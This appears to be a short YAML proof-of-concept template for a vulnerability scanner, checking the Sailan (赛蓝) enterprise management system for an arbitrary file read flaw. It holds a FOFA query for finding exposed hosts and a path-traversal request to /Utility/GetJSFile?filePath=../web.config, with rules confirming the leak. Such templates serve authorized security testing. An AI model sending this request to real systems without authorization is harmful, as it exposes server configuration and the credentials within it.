id: poc-yaml-enterprise-management-system-getjsfile-anyfile-read
info:
  name: 赛蓝企业管理系统 GetJSFile 任意文件读取漏洞
  severity: high
  tags:
  - 文件读取
  finger: 企业管理系统
  fofa: body="www.cailsoft.com" || body="赛蓝企业管理系统"
requests:
- method: GET
  path: /Utility/GetJSFile?filePath=../web.config
  expression: "status_code == 200 && \ncontains(body,\"<configuration>\") &&\ncontains(body,\"\
    web.config\") &&\ncontains(content_type,\"text/javascript\")\n"
variables: {}
transport: http
